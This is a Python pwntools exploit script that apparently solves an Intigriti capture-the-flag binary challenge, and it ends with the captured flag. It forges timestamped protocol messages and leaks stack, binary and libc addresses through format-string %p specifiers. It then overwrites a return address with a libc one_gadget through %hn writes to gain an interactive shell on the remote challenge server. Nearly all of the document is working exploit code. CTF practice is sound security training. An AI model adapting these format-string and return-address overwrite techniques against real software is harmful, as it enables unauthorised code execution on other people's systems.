#!/usr/bin/env python3
from pwn import *
import ctypes

context.terminal = 'wt.exe sp -d . wsl.exe -d Ubuntu'.split()
context.arch = 'amd64'
bin = ELF('./chall_patched')
lib = ELF('./libc.so.6', checksec=False)
LIBC = ctypes.cdll.LoadLibrary('./libc.so.6')
script = """
# printf
brva 0x000000000001464
# brva 0x0000000000017EA
# time validate
# brva 0x000000000001663
# fread
brva 0x000000000001892
brva 0x00000000000182F
c
"""
script+= 'c\n'*2

if args.REMOTE:
    p = remote('ritd.ctf.intigriti.io', 1337)
elif args.GDB:
    p = gdb.debug(bin.path, gdbscript=script, aslr=True)
else:
    p = process(bin.path)

def build_payload(cmd, content):
    return b'|'.join([b'', str(LIBC.time(0)).encode(), cmd, content, b''])
    

# p.recvuntil(b'> ')
# for i in range(80):
#     payload = b'|'.join([b'', str(LIBC.time(0)-20+i).encode(), b'3', b'cc', b''])
#     p.sendline(payload)
#     data = p.recvuntil(b'> ')
#     if b'Invalid' not in data:
#         print("found")
#         print(i)
    
    
# p.sendlineafter(b'> ', build_payload(b'3', b'cc'))
payload = b'|'.join([b'', str(LIBC.time(0)).encode(), b'3', b'cc', b''])
p.sendlineafter(b'> ', payload)
p.sendlineafter(b'> ', build_payload(f'2 %7$p %{6+0x47}$p %{6+0x4a}$p'.encode(), b'cc'))
rec = p.recvline().split(b' ')
stack = int(rec[2], 16)
bin.address = int(rec[3], 16) - 0x1a45
lib.address = int(rec[4], 16) - 0x219aa0
log.info("stack " + hex(stack))
log.info("bin.base " + hex(bin.address))
log.info("lib.base " + hex(lib.address))

# canary_ptr = stack + (0x7fffffffdd59-0x7fffffffdd70)
# print(hex(canary_ptr))
# gdb.attach(p, gdbscript=script)
# sleep(2)
# payload = b'|'.join([b'', str(LIBC.time(0)).encode(), b'2', b'cc', b'']) + b'c' + b'\x00'*6 + p64(canary_ptr)*2
# print(payload)
# p.sendlineafter(b'> ', payload)
# p.sendlineafter(b'> ', build_payload(f'2:%{6+0x56}$s %{6+1}$s'.encode(), b'cc'))
# p.recvuntil(b'2:')
# canary = u64(b'\x00' + p.recv(7))
# log.info("canary " + hex(canary))




ret_addr = stack + (0x7fffffffdd18-0x7fffffffdd70)
payload = b'|'.join([b'', str(LIBC.time(0)).encode(), b'2', b'cc', b'']) + b'c' + b'\x00'*6 + p64(0)*0x10 + p64(ret_addr) + p64(ret_addr+2) + p64(ret_addr+4)
p.sendlineafter(b'> ', payload)
ritd = bin.address + 0x00000000000191E
magic = bin.address + 0x00000000000180A
one_gadget = lib.address + 0xebcf5

word = one_gadget&0xffff
print(hex(word))
payload = f'2 %{word-2}c%{6+0x65}$hn'

word2 = one_gadget>>16&0xffff
print(hex(word2))
payload += f'%{word2+0x10000 - word}c%{6+0x66}$hn'

word3 = one_gadget>>32&0xffff
print(hex(word3))
payload += f'%{word3+0x10000 - word2}c%{6+0x67}$hn'
print(len(payload))
p.sendlineafter(b'> ', build_payload(payload.encode(), b'cc'))



# stdin = bin.address + 0x000000000004020
# fileno = lib.address + 0x219b10
# flag = bin.address + 0x000000000001877
# p.sendlineafter(b'0x)\n', hex(fileno)[2:].encode())
# p.sendlineafter(b'there?\n', b'3')

p.interactive()

# INTIGRITI{Wh4t_I5_The_P0int_0f_Re4ding_1n_Th3_D4rk}